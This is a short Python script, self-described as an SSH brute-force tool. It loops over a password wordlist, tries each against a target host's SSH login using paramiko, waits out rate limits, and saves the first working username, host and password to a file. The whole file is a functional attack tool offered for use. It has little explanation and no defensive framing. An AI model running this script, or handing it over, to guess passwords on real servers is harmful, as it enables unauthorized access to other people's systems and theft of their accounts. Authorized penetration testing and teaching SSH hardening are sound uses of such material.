
import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

def is_ssh_open(hostname, username, password, port):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port, banner_timeout=60, auth_timeout=200, look_for_keys=False, allow_agent=False)
        client.close()
    except paramiko.ssh_exception.SSHException as sshError:
        if sshError == "Authentication failed.":
            print("Authentication failed, passing to next password")
        elif sshError == "Error reading SSH protocol banner":
            print("Quota exceeded, waiting 60 sec before next try")
            time.sleep(60)
        else:
            print(sshError)
        return False
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("fail to connect")
        return False    
    except socket.timeout:
        # this is when host is unreachable
        #print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        print("host unreachable")
        return False
    except paramiko.AuthenticationException:
        #print(f"[!] Invalid credentials for {username}:{password}")
        print("invalid credentail")
        return False
    except paramiko.SSHException:
        #print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        print("Quota exceeded")
        time.sleep(60)
        return is_ssh_open(hostname, username, password, port)
    except Exception as e: 
        print(e)
        return False
    else:
        # connection was established successfully
        #print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    parser.add_argument("-p", "--port", help="Host port")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    port = args.port

    passlist = open(passlist).read().splitlines()

    # brute-force
    for password in passlist:
        print("testing password : "+ password)
        time.sleep(1)
        if is_ssh_open(host, user, password, port):
            print("passwrd find !")
            open("credentials.txt", "w").write(user+"@"+host+":"+password)
            break